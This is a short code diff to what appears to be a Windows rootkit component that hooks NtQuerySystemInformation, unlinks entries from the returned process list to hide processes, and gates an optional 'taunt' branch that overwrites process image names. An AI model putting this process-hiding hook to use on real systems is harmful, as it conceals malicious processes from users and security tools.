@@ -59,10 +59,12 @@ NTSTATUS WINAPI HookedNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemIn
                     prev->NextEntryOffset += curr->NextEntryOffset;
                 curr = prev;
             }
+#if TAUNT
             else if (TAUNT)
             {
-                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, DLL, curr->ImageName.Length, NULL);
+                WriteProcessMemory(GetCurrentProcess(), curr->ImageName.Buffer, TAUNTVALUE, curr->ImageName.Length, NULL);
             }
+#endif
             prev = curr;
             curr = PMY_SYSTEM_PROCESS_INFORMATION((PUCHAR)curr + curr->NextEntryOffset);
         }
